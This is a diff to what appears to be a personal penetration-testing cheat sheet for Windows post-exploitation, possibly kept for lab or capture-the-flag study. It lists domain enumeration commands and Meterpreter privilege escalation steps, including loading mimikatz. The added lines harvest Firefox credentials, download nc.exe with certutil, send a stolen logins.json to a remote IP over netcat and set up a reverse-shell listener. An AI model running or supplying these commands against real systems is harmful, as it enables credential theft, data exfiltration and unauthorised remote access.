@@ -192,7 +192,6 @@ Invoke-ShareFinder
 Windows 10 Enterprise Evaluation
 get-netuser | select cn #enum domain users
 Get-NetGroup -GroupName *admin* #enum domain groups
-```
 
 meterpreter
 ```bash
@@ -200,6 +199,8 @@ run post/multi/recon/local_exploit_suggester #in session
 getsystem
 getprivs
 load kiwi #download mimikatz
+run post/windows/gather/enum_applications
+run post/multi/gather/firefox_creds
 ```
 
 view all of the hidden files in the current directory
@@ -215,3 +216,21 @@ Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue
 - [LOLBAS (windows)](https://lolbas-project.github.io/)
 - [JAWS](https://github.com/411Hall/JAWS)
 - [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
+#### other
+download file
+```
+certutil -urlcache -f http://<ip>:<port>/nc.exe nc.exe
+```
+file transfer
+```
+nc -nlvp 1234 > logins.json
+nc.exe -nv 10.9.3.214 1234 < logins.json
+```
+[tool to decrypt Mozilla protected passwords](https://github.com/lclevy/firepwd)
+set listener
+```
+use multi/handler
+set lport lhost
+set PAYLOAD windows/meterpreter/reverse_tcp
+run -j (in background)
+```
